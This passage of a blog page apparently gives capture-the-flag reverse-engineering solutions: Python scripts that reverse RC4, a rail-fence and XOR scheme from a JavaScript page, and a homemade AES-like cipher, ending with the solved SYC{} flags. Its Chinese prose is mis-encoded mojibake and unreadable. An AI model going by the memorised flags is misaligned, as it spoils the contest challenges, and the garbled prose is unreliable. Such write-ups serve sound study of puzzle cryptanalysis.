class="number">0xB2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">S[i] = i</span><br><span class="line">Key[i] = <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])</span><br><span class="line"></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">j = (j + S[i] + Key[i]) % N</span><br><span class="line">S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line">i = (i + <span class="number">1</span>) % N</span><br><span class="line">j = (j + S[i]) % N</span><br><span class="line">S[i], S[j] = S[j], S[i]</span><br><span class="line">t[k] ^= S[(S[i] + S[j]) % N]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> t))</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;N0thing_1s_sEriOus_But_MIku&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="æµªæ¼«è‡³æ­»ä¸æ¸"><a href="#æµªæ¼«è‡³æ­»ä¸æ¸" class="headerlink" title="æµªæ¼«è‡³æ­»ä¸æ¸"></a>æµªæ¼«è‡³æ­»ä¸æ¸</h3><blockquote><p>æŸå¸ˆå‚…æƒ³ç»™ä»–çš„å¥³ç¥è¡¨ç™½ï¼Œä»–å†™äº†ä¸€ä¸ªç½‘ç«™ï¼Œç‚¹çˆ±å¿ƒä¹‹åå°±èƒ½è¾“å…¥å¯†ç ï¼Œä½†æ˜¯åœ¨å†™çš„è¿‡ç¨‹ä¸­ä»–ä¸å°å¿ƒæŠŠæç¤ºçš„å¯†ç åˆ é™¤äº†ï¼Œä½ èƒ½å¸®ä»–æ‰¾å‡ºè¡¨ç™½å¯†ç å—ï¼Ÿ(è¾“å…¥å¯†ç æ—¶ï¼Œè®°å¾—åˆ·æ–°å–”ï¼‰ ps:è¯·å°†å¯†ç åŒ…è£¹SYC{}ä¸Šäº¤ï¼Œä¸”å°†å­—æ¯å…¨æ”¹ä¸ºå¤§å†™</p></blockquote><p>jsæ–‡ä»¶åŠ å¯†é€»è¾‘åˆ†æã€‚</p><p>keyä¸ºText1ï¼Œé‡‡ç”¨äº†æ …æ å¯†ç åŠ å¯†å¾—åˆ° <code>53X211WH04N</code>ï¼Œåˆ©ç”¨ç°æœ‰çš„ <code>decryptRailFence()</code> å‡½æ•°è§£å¯†ï¼š</p><p><code>decryptRailFence(&#39;53X211WH04N&#39;,3)=&#39;5201314WXHN&#39;</code></p><p>å¯†æ–‡ä¸ºï¼š<code>125, 130, 131, 122, 117, 110, 123, 125, 130, 131, 122, 117, 110, 123, 99, 99, 99, 99</code></p><p>åŠ å¯†é€»è¾‘ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">i&lt;14 æ—¶ï¼šc[i]=(m[i]^k[i%7])+10</span><br><span class="line">i&gt;=14 æ—¶ï¼šc[i]=(m[i]^k[i-7])+99</span><br></pre></td></tr></table></figure><p>è¿˜åŸæ˜æ–‡ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">125</span>, <span class="number">130</span>, <span class="number">131</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">123</span>, <span class="number">125</span>, <span class="number">130</span>, <span class="number">131</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">123</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">99</span>, <span class="number">99</span>]</span><br><span class="line">k = <span class="built_in">list</span>(<span class="string">b&#x27;5201314WXHN&#x27;</span>)</span><br><span class="line"></span><br><span class="line">m = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="number">14</span>:</span><br><span class="line">        m.append((c[i]-<span class="number">10</span>)^k[i%<span class="number">7</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m.append((c[i]-<span class="number">99</span>)^k[i-<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;FJIAXUEFJIAXUEWXHN&#x27;</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>SYC&#123;FJIAXUEFJIAXUEWXHN&#125;</code></p><p>â€‹    </p><h3 id="AES-AES"><a href="#AES-AES" class="headerlink" title="AES! AES?"></a>AES! AES?</h3><blockquote><p>Whatâ€™s this ?</p></blockquote><p>ç…§é€»è¾‘å°è¯•é€†å‘å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">v17 = [<span class="number">224</span>, -<span class="number">251</span>, -<span class="number">146</span>, -<span class="number">62</span>, -<span class="number">146</span>, -<span class="number">103</span>, -<span class="number">152</span>, <span class="number">69</span>, -<span class="number">131</span>, -<span class="number">225</span>, -<span class="number">193</span>, -<span class="number">7</span>, -<span class="number">105</span>, -<span class="number">138</span>, <span class="number">59</span>, <span class="number">146</span>, <span class="number">47</span>, -<span class="number">188</span>, -<span class="number">250</span>, -<span class="number">153</span>, -<span class="number">88</span>, -<span class="number">21</span>, -<span class="number">20</span>, <span class="number">74</span>, -<span class="number">145</span>, -<span class="number">24</span>, -<span class="number">203</span>, -<span class="number">7</span>, -<span class="number">84</span>, -<span class="number">89</span>, <span class="number">140</span>, <span class="number">113</span>]</span><br><span class="line">c = [k&amp;<span class="number">0xff</span> <span class="keyword">for</span> k <span class="keyword">in</span> v17]</span><br><span class="line"></span><br><span class="line">v16 = [<span class="number">110</span>, <span class="number">121</span>, <span class="number">105</span>, <span class="number">131</span>, <span class="number">121</span>, <span class="number">127</span>, <span class="number">105</span>, <span class="number">117</span>, <span class="number">121</span>, <span class="number">120</span>, </span><br><span class="line">  <span class="number">129</span>, <span class="number">105</span>, <span class="number">93</span>, <span class="number">99</span>, <span class="number">77</span>, <span class="number">73</span>]</span><br><span class="line"></span><br><span class="line">v13 = [<span class="number">122</span>, <span class="number">118</span>, <span class="number">107</span>, <span class="number">109</span>, <span class="number">111</span>,  <span class="number">42</span>, <span class="number">115</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">127</span>, </span><br><span class="line">  <span class="number">126</span>,  <span class="number">42</span>, <span class="number">131</span>, <span class="number">121</span>, <span class="number">127</span>, <span class="number">124</span>,  <span class="number">42</span>, <span class="number">112</span>, <span class="number">118</span>, <span class="number">107</span>, </span><br><span class="line">  <span class="number">113</span>,  <span class="number">68</span>,  <span class="number">42</span>,  <span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">v14 = v15 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">v10 = [<span class="number">131</span>, <span class="number">111</span>, <span class="number">125</span>,  <span class="number">43</span>,  <span class="number">42</span>, <span class="number">131</span>, <span class="number">121</span>, <span class="number">127</span>,  <span class="number">42</span>, <span class="number">107</span>, </span><br><span class="line">  <span class="number">124</span>, <span class="number">111</span>,  <span class="number">42</span>, <span class="number">124</span>, <span class="number">115</span>, <span class="number">113</span>, <span class="number">114</span>, <span class="number">126</span>,  <span class="number">43</span>,  <span class="number">20</span>, </span><br><span class="line">   <span class="number">10</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">136</span>, <span class="number">126</span>, <span class="number">124</span>, <span class="number">131</span>,  <span class="number">42</span>, <span class="number">107</span>, <span class="number">113</span>, </span><br><span class="line">  <span class="number">107</span>, <span class="number">115</span>, <span class="number">120</span>, <span class="number">136</span>,  <span class="number">20</span>,  <span class="number">10</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">136</span>,  <span class="number">10</span>]</span><br><span class="line"></span><br><span class="line">S = [<span class="number">99</span>, <span class="number">124</span>, <span class="number">119</span>, <span class="number">123</span>, <span class="number">242</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">197</span>,  <span class="number">48</span>,   <span class="number">1</span>, </span><br><span class="line">  <span class="number">103</span>,  <span class="number">43</span>, <span class="number">254</span>, <span class="number">215</span>, <span class="number">171</span>, <span class="number">118</span>, <span class="number">202</span>, <span class="number">130</span>, <span class="number">201</span>, <span class="number">125</span>, </span><br><span class="line">  <span class="number">250</span>,  <span class="number">89</span>,  <span class="number">71</span>, <span class="number">240</span>, <span class="number">173</span>, <span class="number">212</span>, <span class="number">162</span>, <span class="number">175</span>, <span class="number">156</span>, <span class="number">164</span>, </span><br><span class="line">  <span class="number">114</span>, <span class="number">192</span>, <span class="number">183</span>, <span class="number">253</span>, <span class="number">147</span>,  <span class="number">38</span>,  <span class="number">54</span>,  <span class="number">63</span>, <span class="number">247</span>, <span class="number">204</span>, </span><br><span class="line">   <span class="number">52</span>, <span class="number">165</span>, <span class="number">229</span>, <span class="number">241</span>, <span class="number">113</span>, <span class="number">216</span>,  <span class="number">49</span>,  <span class="number">21</span>,   <span class="number">4</span>, <span class="number">199</span>, </span><br><span class="line">   <span class="number">35</span>, <span class="number">195</span>,  <span class="number">24</span>, <span class="number">150</span>,   <span class="number">5</span>, <span class="number">154</span>,   <span class="number">7</span>,  <span class="number">18</span>, <span class="number">128</span>, <span class="number">226</span>, </span><br><span class="line">  <span class="number">235</span>,  <span class="number">39</span>, <span class="number">178</span>, <span class="number">117</span>,   <span class="number">9</span>, <span class="number">131</span>,  <span class="number">44</span>,  <span class="number">26</span>,  <span class="number">27</span>, <span class="number">110</span>, </span><br><span class="line">   <span class="number">90</span>, <span class="number">160</span>,  <span class="number">82</span>,  <span class="number">59</span>, <span class="number">214</span>, <span class="number">179</span>,  <span class="number">41</span>, <span class="number">227</span>,  <span class="number">47</span>, <span class="number">132</span>, </span><br><span class="line">   <span class="number">83</span>, <span class="number">209</span>,   <span class="number">0</span>, <span class="number">237</span>,  <span class="number">32</span>, <span class="number">252</span>, <span class="number">177</span>,  <span class="number">91</span>, <span class="number">106</span>, <span class="number">203</span>, </span><br><span class="line">  <span class="number">190</span>,  <span class="number">57</span>,  <span class="number">74</span>,  <span class="number">76</span>,  <span class="number">88</span>, <span class="number">207</span>, <span class="number">208</span>, <span class="number">239</span>, <span class="number">170</span>, <span class="number">251</span>, </span><br><span class="line">   <span class="number">67</span>,  <span class="number">77</span>,  <span class="number">51</span>, <span class="number">133</span>,  <span class="number">69</span>, <span class="number">249</span>,   <span class="number">2</span>, <span class="number">127</span>,  <span class="number">80</span>,  <span class="number">60</span>, </span><br><span class="line">  <span class="number">159</span>, <span class="number">168</span>,  <span class="number">81</span>, <span class="number">163</span>,  <span class="number">64</span>, <span class="number">143</span>, <span class="number">146</span>, <span class="number">157</span>,  <span class="number">56</span>, <span class="number">245</span>, </span><br><span class="line">  <span class="number">188</span>, <span class="number">182</span>, <span class="number">218</span>,  <span class="number">33</span>,  <span class="number">16</span>, <span class="number">255</span>, <span class="number">243</span>, <span class="number">210</span>, <span class="number">205</span>,  <span class="number">12</span>, </span><br><span class="line">   <span class="number">19</span>, <span class="number">236</span>,  <span class="number">95</span>, <span class="number">151</span>,  <span class="number">68</span>,  <span class="number">23</span>, <span class="number">196</span>, <span class="number">167</span>, <span class="number">126</span>,  <span class="number">61</span>, </span><br><span class="line">  <span class="number">100</span>,  <span class="number">93</span>,  <span class="number">25</span>, <span class="number">115</span>,  <span class="number">96</span>, <span class="number">129</span>,  <span class="number">79</span>, <span class="number">220</span>,  <span class="number">34</span>,  <span class="number">42</span>, </span><br><span class="line">  <span class="number">144</span>, <span class="number">136</span>,  <span class="number">70</span>, <span class="number">238</span>, <span class="number">184</span>,  <span class="number">20</span>, <span class="number">222</span>,  <span class="number">94</span>,  <span class="number">11</span>, <span class="number">219</span>, </span><br><span class="line">  <span class="number">224</span>,  <span class="number">50</span>,  <span class="number">58</span>,  <span class="number">10</span>,  <span class="number">73</span>,   <span class="number">6</span>,  <span class="number">36</span>,  <span class="number">92</span>, <span class="number">194</span>, <span class="number">211</span>, </span><br><span class="line">  <span class="number">172</span>,  <span class="number">98</span>, <span class="number">145</span>, <span class="number">149</span>, <span class="number">228</span>, <span class="number">121</span>, <span class="number">231</span>, <span class="number">200</span>,  <span class="number">55</span>, <span class="number">109</span>, </span><br><span class="line">  <span class="number">141</span>, <span class="number">213</span>,  <span class="number">78</span>, <span class="number">169</span>, <span class="number">108</span>,  <span class="number">86</span>, <span class="number">244</span>, <span class="number">234</span>, <span class="number">101</span>, <span class="number">122</span>, </span><br><span class="line">  <span class="number">174</span>,   <span class="number">8</span>, <span class="number">186</span>, <span class="number">120</span>,  <span class="number">37</span>,  <span class="number">46</span>,  <span class="number">28</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">198</span>, </span><br><span class="line">  <span class="number">232</span>, <span class="number">221</span>, <span class="number">116</span>,  <span class="number">31</span>,  <span class="number">75</span>, <span class="number">189</span>, <span class="number">139</span>, <span class="number">138</span>, <span class="number">112</span>,  <span class="number">62</span>, </span><br><span class="line">  <span class="number">181</span>, <span class="number">102</span>,  <span class="number">72</span>,   <span class="number">3</span>, <span class="number">246</span>,  <span class="number">14</span>,  <span class="number">97</span>,  <span class="number">53</span>,  <span class="number">87</span>, <span class="number">185</span>, </span><br><span class="line">  <span class="number">134</span>, <span class="number">193</span>,  <span class="number">29</span>, <span class="number">158</span>, <span class="number">225</span>, <span class="number">248</span>, <span class="number">152</span>,  <span class="number">17</span>, <span class="number">105</span>, <span class="number">217</span>, </span><br><span class="line">  <span class="number">142</span>, <span class="number">148</span>, <span class="number">155</span>,  <span class="number">30</span>, <span class="number">135</span>, <span class="number">233</span>, <span class="number">206</span>,  <span class="number">85</span>,  <span class="number">40</span>, <span class="number">223</span>, </span><br><span class="line">  <span class="number">140</span>, <span class="number">161</span>, <span class="number">137</span>,  <span class="number">13</span>, <span class="number">191</span>, <span class="number">230</span>,  <span class="number">66</span>, <span class="number">104</span>,  <span class="number">65</span>, <span class="number">153</span>, </span><br><span class="line">   <span class="number">45</span>,  <span class="number">15</span>, <span class="number">176</span>,  <span class="number">84</span>, <span class="number">187</span>,  <span class="number">22</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    v13[i] -= <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(v13))</span><br><span class="line"><span class="comment"># v13 = b&#x27;place inout your flag: \n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    v10[i] -= <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(v10))</span><br><span class="line"><span class="comment"># v10 = b&#x27;yes! you are right!\n\x00&#x27;</span></span><br><span class="line"><span class="comment"># v11 = b&#x27;no~try again~\n\x00&#x27;</span></span><br><span class="line"><span class="comment"># v12 = b&#x27;no~\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># len(s) == 32</span></span><br><span class="line"></span><br><span class="line">v7 = [k-<span class="number">10</span> <span class="keyword">for</span> k <span class="keyword">in</span> v16]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(v7))</span><br><span class="line"><span class="comment"># v16 = v7 = b&#x27;do_you_konw_SYC?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s[5] = 46</span></span><br><span class="line"><span class="comment"># s[10] = 108</span></span><br><span class="line"><span class="comment"># s[17] = 48</span></span><br><span class="line"></span><br><span class="line">v18 = [<span class="number">100</span>, <span class="number">111</span>,  <span class="number">95</span>, <span class="number">121</span>, <span class="number">111</span>, <span class="number">117</span>,  <span class="number">95</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">110</span>, </span><br><span class="line">  <span class="number">119</span>,  <span class="number">95</span>,  <span class="number">83</span>,  <span class="number">89</span>,  <span class="number">67</span>,  <span class="number">63</span>,  <span class="number">39</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, </span><br><span class="line">  <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>,  <span class="number">20</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, </span><br><span class="line">   <span class="number">89</span>,  <span class="number">74</span>, <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, </span><br><span class="line">  <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>, <span class="number">199</span>, </span><br><span class="line">  <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, </span><br><span class="line">  <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, </span><br><span class="line">  <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, </span><br><span class="line">  <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, </span><br><span class="line">  <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, </span><br><span class="line">  <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, </span><br><span class="line">  <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, </span><br><span class="line">  <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>, <span class="number">199</span>, </span><br><span class="line">  <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, </span><br><span class="line">  <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, </span><br><span class="line">  <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, </span><br><span class="line">  <span class="number">235</span>, <span class="number">199</span>, <span class="number">144</span>, <span class="number">207</span>, <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, </span><br><span class="line">  <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, <span class="number">146</span>, <span class="number">156</span>, <span class="number">235</span>,  <span class="number">57</span>, <span class="number">144</span>, <span class="number">207</span>, </span><br><span class="line">  <span class="number">199</span>, <span class="number">232</span>, <span class="number">144</span>, <span class="number">238</span>, <span class="number">199</span>, <span class="number">241</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">190</span>, <span class="number">146</span>, </span><br><span class="line">  <span class="number">146</span>, <span class="number">156</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------------------------------------</span></span><br><span class="line"><span class="comment"># encrypt </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ShiftRow</span>(<span class="params">A</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">16</span>,<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(math.ceil(i/<span class="number">4</span>)):</span><br><span class="line">            A[i],A[i+<span class="number">1</span>],A[i+<span class="number">2</span>],A[i+<span class="number">3</span>] = A[i+<span class="number">1</span>],A[i+<span class="number">2</span>],A[i+<span class="number">3</span>],A[i]</span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transform</span>(<span class="params">A</span>):</span><br><span class="line">    tmp = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        tmp[i] = A[i]</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            A[x] = tmp[<span class="number">4</span>*k+j]</span><br><span class="line">            A[x] = S[A[x]]</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">list</span>(<span class="string">b&#x27;abcde.ghijllmnopq0stuvwxyz123457&#x27;</span>)</span><br><span class="line">v = [S[s[i]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line">v = ShiftRow(v[:<span class="number">16</span>])+ShiftRow(v[<span class="number">16</span>:])</span><br><span class="line">v = transform(v[:<span class="number">16</span>])+transform(v[<span class="number">16</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    v[k] ^= v18[k]</span><br><span class="line">    v[k+<span class="number">16</span>] ^= v18[k]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    v[k] = S[v[k]]</span><br><span class="line"></span><br><span class="line">v = ShiftRow(v[:<span class="number">16</span>])+ShiftRow(v[<span class="number">16</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    v[k] ^= v18[<span class="number">16</span>+k]</span><br><span class="line">    v[k+<span class="number">16</span>] ^= v18[<span class="number">16</span>+k]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------------------------------------</span></span><br><span class="line"><span class="comment"># decrypt </span></span><br><span class="line"></span><br><span class="line">S_inv = [S.index(k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unShiftRow</span>(<span class="params">A</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">16</span>,<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(math.ceil(i/<span class="number">4</span>)):</span><br><span class="line">            A[i],A[i+<span class="number">1</span>],A[i+<span class="number">2</span>],A[i+<span class="number">3</span>] = A[i+<span class="number">3</span>],A[i],A[i+<span class="number">1</span>],A[i+<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">return</span> A</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">untransform</span>(<span class="params">A</span>):</span><br><span class="line">    A = [S_inv[A[k]] <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">    tmp = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            tmp[<span class="number">4</span>*k+j] = A[x]</span><br><span 